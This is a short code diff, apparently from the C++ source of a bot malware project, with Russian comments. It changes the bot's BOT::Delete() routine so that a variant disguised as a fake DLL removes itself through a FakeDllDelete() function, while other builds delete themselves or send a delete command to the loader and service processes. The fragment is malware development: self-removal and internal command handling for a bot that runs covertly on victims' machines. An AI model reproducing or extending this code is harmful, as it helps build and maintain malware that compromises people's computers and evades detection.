@@ -26,7 +26,11 @@ namespace COREDEBUGSTRINGS
 //---------------------------------------------------------------------------
 
 
-
+//если компилится bot.plug, то функция его удаления находится в файле main.cpp его проекта
+//для остальных проектов такое удаление не нужно
+#ifdef BOTPLUG
+	extern bool FakeDllDelete();
+#endif
 
 
 
@@ -909,20 +913,32 @@ bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
 //----------------------------------------------------
 void BOT::Delete()
 {
-	if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
+	bool deleted = false;
+	switch( BOT::GetBotType() )
 	{
-		bool C; // Для согласования вызова
-		ExecuteDeleteBot(NULL, NULL, C);
+#ifdef BOTPLUG
+		case BotFakeDll:
+			deleted = FakeDllDelete();			
+			break;
+#endif
 	}
-	else
+	if( !deleted )
 	{
-		//  Метод вызывается из другого процесса,
-		//  Отправляем команду на удаление
-		string Cmd = GetStr(EStrProcessCommandDeleteBot);
+		if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
+		{
+			bool C; // Для согласования вызова
+			ExecuteDeleteBot(NULL, NULL, C);
+		}
+		else
+		{
+			//  Метод вызывается из другого процесса,
+			//  Отправляем команду на удаление
+			string Cmd = GetStr(EStrProcessCommandDeleteBot);
 
-		SendProcessMessage(ProcessLoader,  Cmd);
-		SendProcessMessage(ProcessService, Cmd);
-    }
+			SendProcessMessage(ProcessLoader,  Cmd);
+			SendProcessMessage(ProcessService, Cmd);
+		}
+	}
 }
 //----------------------------------------------------------------------------
 
